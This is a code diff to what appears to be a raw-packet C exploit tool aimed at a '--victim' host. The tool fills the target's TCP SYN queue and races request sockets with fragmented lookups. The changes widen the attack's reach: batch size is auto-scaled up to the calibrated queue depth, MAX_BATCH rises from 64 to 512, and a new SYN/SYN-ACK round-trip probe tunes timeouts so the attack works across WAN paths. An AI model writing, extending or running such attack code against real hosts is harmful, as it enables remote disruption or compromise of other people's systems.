@@ -175,7 +175,7 @@
 #define ARP_OFF_TPA 24
 #define ARP_FRAME_LEN 42
 
-#define MAX_BATCH 64
+#define MAX_BATCH 512
 #define JUNK_MAX 16384
 #define SPORT_TABLE 65536
 #define PKT_MAX 1600
@@ -211,6 +211,7 @@ struct cfg {
 	bool keep_children;  /* do not send the per-shot cleanup RST */
 	bool quiet;
 	bool debug;
+	bool synack_set;     /* --synack-ms given explicitly */
 
 	int mode;
 	int backlog;         /* 0 = calibrate */
@@ -235,7 +236,7 @@ static struct cfg g = {
 	.dport = 0,
 	.mode = MODE_RACE,
 	.backlog = 0,
-	.batch = 8,
+	.batch = 0, /* auto: one round = the calibrated queue depth */
 	.duration = 60,
 	.fill = 128,
 	.readers = 1,
@@ -1185,8 +1186,15 @@ static int calibrate_fill(void)
 			r = probe_tuple_ex(sport, s, tmo, true);
 		}
 		if (r < 0)
-			die("target does not answer SYN packets on port %u",
-			    (unsigned)g.dport);
+			die("no SYN-ACK within %d ms (target %s:%u)\n"
+			    "      If the target answers a normal connect but not "
+			    "this, the SYN-ACK is\n"
+			    "      arriving after the timeout: raise --synack-ms "
+			    "(currently %d).\n"
+			    "      If it never answers, the path is filtering the "
+			    "probe.",
+			    g.synack_ms << 3, ipstr(g.dst), (unsigned)g.dport,
+			    g.synack_ms);
 		if (g.debug)
 			info("[dbg] calib mid=%d r=%d\n", mid, r);
 		if (r == 1)
@@ -1404,6 +1412,17 @@ static int mode_race(void)
 	info("[*] target %s:%u  src %s  dev %s\n",
 	     ipstr(g.dst), (unsigned)g.dport, ipstr(g.src), g.ifname);
 	calibrate_fill();
+	if (g.batch == 0) {
+		/* Auto: one round should create as many request sockets as the
+		 * queue can hold, because a round costs one round trip anyway. */
+		g.batch = g.fill;
+		if (g.batch > MAX_BATCH)
+			g.batch = MAX_BATCH;
+		if (g.batch < 1)
+			g.batch = 1;
+	}
+	if (g.batch > (g.sport_high - g.sport_low) / 4)
+		g.batch = (g.sport_high - g.sport_low) / 4;
 	info("[*] race: batch=%d readers=%d fill=%d gaps=%d/%d/%d us jitter=%d us\n",
 	     g.batch, g.readers, g.fill, g.frag_gap_us, g.free_gap_us,
 	     g.alloc_gap_us, g.jitter_us);
@@ -1665,7 +1684,7 @@ static void usage(FILE *out, const char *a0)
 		"  --dev NAME             interface (default: from the route)\n"
 		"  --backlog N            target listen backlog (default: calibrate)\n"
 		"  --fill N               SYNs used to fill the SYN queue\n"
-		"  --batch N              tuples raced per round (default 8, max 64)\n"
+		"  --batch N              tuples per round; 0 = calibrated queue depth (default)\n"
 		"  --readers N            fragmented lookups per shot (default 1)\n"
 		"  --duration SEC         race duration (default 60)\n"
 		"  --payload N            reader TCP payload bytes (default 16)\n"
@@ -1783,6 +1802,7 @@ static void parse_args(int argc, char **argv)
 			i++;
 		} else if (!strcmp(a, "--synack-ms") && v) {
 			g.synack_ms = atoi(v);
+			g.synack_set = true;
 			i++;
 		} else if (!strcmp(a, "--sport-range") && v) {
 			parse_range(v, &g.sport_low, &g.sport_high);
@@ -1810,8 +1830,8 @@ static void parse_args(int argc, char **argv)
 		usage(stderr, argv[0]);
 		die("--victim and --port are required");
 	}
-	if (g.batch < 1 || g.batch > MAX_BATCH)
-		die("--batch must be 1..%d", MAX_BATCH);
+	if (g.batch < 0 || g.batch > MAX_BATCH)
+		die("--batch must be 0 (auto) or 1..%d", MAX_BATCH);
 	if (g.readers < 1)
 		die("--readers must be >= 1");
 	if (g.payload < 1 || g.payload > (int)sizeof(g_payload))
@@ -1953,6 +1973,48 @@ static void leak_check(void)
 		info("[*] no host RST leak\n");
 }
 
+/*
+ * A SYN/SYN-ACK round trip is the only reliable way to learn how long the tool
+ * may wait for the target.  The 10 ms default is fine on loopback but far too
+ * short for a WAN path, where the calibration would otherwise give up on a
+ * target that answers perfectly well.  Unless --synack-ms was given, use four
+ * round trips (plus margin) as the timeout.
+ */
+static void auto_tune_synack(void)
+{
+	uint16_t sport = take_sport();
+	uint32_t seq = rnd32();
+	struct synwatch w;
+	uint64_t t0, dt;
+	int rtt_ms = -1;
+
+	if (g.synack_set)
+		return;
+
+	w = syn_watch(sport);
+	t0 = now_ns();
+	tcp_send(sport, seq, 0, F_SYN, NULL, 0);
+	if (syn_wait_ack(&w, seq, NULL, 2000)) {
+		dt = now_ns() - t0;
+		rtt_ms = (int)(dt / 1000000ull);
+	}
+	tcp_send(sport, seq + 1, 0, F_RST, NULL, 0);
+
+	if (rtt_ms < 0) {
+		info("[!] no SYN-ACK within 2 s; the target may be filtered\n");
+		return;
+	}
+	if (rtt_ms > g.synack_ms / 4) {
+		int want = 4 * rtt_ms + 10;
+
+		info("[*] round trip %d ms -> SYN-ACK timeout %d ms "
+		     "(override with --synack-ms)\n", rtt_ms, want);
+		g.synack_ms = want;
+	} else if (!g.quiet) {
+		info("[*] round trip %d ms\n", rtt_ms);
+	}
+}
+
 int main(int argc, char **argv)
 {
 	pthread_t sniffer;
@@ -1967,6 +2029,7 @@ int main(int argc, char **argv)
 	if (pthread_create(&sniffer, NULL, sniffer_main, NULL) != 0)
 		die("cannot start the packet sniffer thread");
 
+	auto_tune_synack();
 	leak_check();
 
 	switch (g.mode) {
